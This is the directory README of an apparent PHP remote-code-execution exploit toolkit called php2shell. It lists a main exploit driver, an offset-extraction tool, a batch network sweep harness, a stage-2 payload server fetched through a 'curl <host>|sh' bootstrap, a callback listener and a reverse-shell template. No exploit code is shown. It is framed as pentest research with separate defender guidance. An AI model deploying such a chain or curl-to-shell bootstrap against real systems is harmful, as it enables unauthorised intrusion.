# php2shell exploit toolkit

**See the top-level `README.md`** for research context, honest reach, and defender
guidance.

## Files in this directory

| File | Purpose |
|---|---|
| `php2shell.py` | Main exploit driver. Mod_php chain (Docker-targeted), with `--sury`, `--remi`, `--fpm` modes. |
| `extract_offsets.py` | Operator calibration tool. Pulls `zif_system` + `zval_ptr_dtor` from any `libphp.so` or `php-fpm` binary via a `zend_function_entry` scan. |
| `php2sweep.py` | Batch probe/exploit/report harness for internal pentest scope. Supports CIDR, nmap XML, scope lists. |
| `serve_stage2.py` | HTTP server for the arbitrary-length stage-2 payload the `curl <host>\|sh` bootstrap fetches. |
| `listener.py` | Minimal callback listener for stage-2 confirmation. |
| `stage2.sh` | Template reverse-shell payload (edit `LHOST`/`LPORT` before use). |
| `CREDITS.md` | Attribution for upstream lineage. |

## Quick start

See `python3 php2shell.py --help` for the full CLI. The top-level `README.md`
and `DISTRO_EXPLOITABILITY.md` cover reach, config requirements, and the
Docker-vs-distro story.
